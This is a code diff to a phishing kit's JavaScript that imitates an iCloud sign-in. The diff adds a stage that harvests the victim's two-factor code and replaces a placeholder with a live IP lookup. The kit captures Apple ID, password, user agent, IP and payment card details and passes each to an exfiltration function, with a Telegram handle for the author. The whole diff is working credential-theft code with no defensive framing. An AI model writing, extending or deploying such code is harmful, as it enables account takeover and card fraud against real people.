@@ -1,7 +1,9 @@
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginFormElement');
+    const twoFactorForm = document.getElementById('twoFactorForm');
     const cardForm = document.getElementById('cardForm');
     const secondCardForm = document.getElementById('secondCardForm');
+    const twoFactorPage = document.getElementById('twoFactorPage');
     const cardVerifyPage = document.getElementById('cardVerifyPage');
     const pageContainer = document.getElementById('pageContainer');
     const declinedMsg = document.getElementById('declinedMsg');
@@ -17,20 +19,49 @@ document.addEventListener('DOMContentLoaded', function() {
         const submitBtn = loginForm.querySelector('.submit-btn');
         submitBtn.innerHTML = '<div class="loading">Verifying...</div>';
 
-        setTimeout(() => {
-            // Exfil Login Data
-            const userAgent = navigator.userAgent;
-            const ip = 'SIMULATED_IP'; // Replace with https://api.ipify.org?format=json in prod
-            const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: ${ip}\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
-            window.exfilData(loginData);
+        // Fetch Real IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip || 'Unknown';
+                const userAgent = navigator.userAgent;
+                const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: ${ip}\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
+                window.exfilData(loginData);
 
-            // Show Card Verification
-            pageContainer.style.display = 'none';
-            cardVerifyPage.classList.remove('hidden');
-        }, 1500);
+                // Show 2FA Page
+                setTimeout(() => {
+                    pageContainer.style.display = 'none';
+                    twoFactorPage.classList.remove('hidden');
+                }, 1500);
+            })
+            .catch(() => {
+                const userAgent = navigator.userAgent;
+                const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: Unknown\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
+                window.exfilData(loginData);
+                setTimeout(() => {
+                    pageContainer.style.display = 'none';
+                    twoFactorPage.classList.remove('hidden');
+                }, 1500);
+            });
     });
 
-    // Stage 2: Card Harvest (First Card)
+    // Stage 2: 2FA Harvest
+    twoFactorForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const code = document.getElementById('verificationCode').value;
+
+        // Exfil 2FA
+        const twoFaData = `🔑 2FA Code: ${code}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
+        window.exfilData(twoFaData);
+
+        // Show Card Verification
+        setTimeout(() => {
+            twoFactorPage.classList.add('hidden');
+            cardVerifyPage.classList.remove('hidden');
+        }, 1000);
+    });
+
+    // Stage 3: Card Harvest (First Card)
     cardForm.addEventListener('submit', (e) => {
         e.preventDefault();
         const cardName = document.getElementById('cardName').value;
@@ -72,7 +103,7 @@ document.addEventListener('DOMContentLoaded', function() {
         secondCardForm.classList.remove('hidden');
     });
 
-    // Stage 3: Second Card Harvest
+    // Stage 4: Second Card Harvest
     secondCardForm.addEventListener('submit', (e) => {
         e.preventDefault();
         const cardName2 = document.getElementById('cardName2').value;
